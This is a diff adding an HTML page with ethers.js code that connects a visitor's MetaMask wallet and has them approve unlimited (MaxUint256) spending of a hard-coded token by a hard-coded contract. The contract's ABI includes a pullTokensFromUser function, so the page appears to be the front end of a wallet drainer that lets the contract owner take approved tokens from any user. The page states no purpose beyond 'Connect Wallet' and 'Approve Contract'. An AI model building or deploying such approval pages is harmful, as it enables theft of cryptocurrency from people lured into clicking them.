@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Wallet Connect + Approve</title>
+</head>
+<body>
+  <button id="connect">Connect Wallet</button>
+  <button id="approve">Approve Contract</button>
+  <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
+  <script>
+    const CONTRACT_ADDRESS = "0x2aeFA4bbD4134f7B33421c4D87C8C7B4804cEcC1";  // <-- change this
+    const TOKEN_ADDRESS = "0xbea1762935F5C92b6c906b5cdEABB51211067098";        // <-- change this
+
+    const ABI = [
+      "function pullTokensFromUser(address user, uint256 amount) external",
+      "function getUserAllowance(address user) external view returns (uint256)"
+    ];
+
+    const ERC20_ABI = [
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+
+    let signer, contract, token;
+
+    document.getElementById("connect").onclick = async () => {
+      if (window.ethereum) {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+
+        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+        token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
+
+        alert("Wallet connected!");
+      } else {
+        alert("MetaMask not found!");
+      }
+    };
+
+    document.getElementById("approve").onclick = async () => {
+      const maxUint = ethers.constants.MaxUint256;
+      try {
+        const tx = await token.approve(CONTRACT_ADDRESS, maxUint);
+        await tx.wait();
+        alert("Contract approved for unlimited token transfer");
+      } catch (err) {
+        console.error(err);
+        alert("Approval failed");
+      }
+    };
+  </script>
+</body>
+</html>
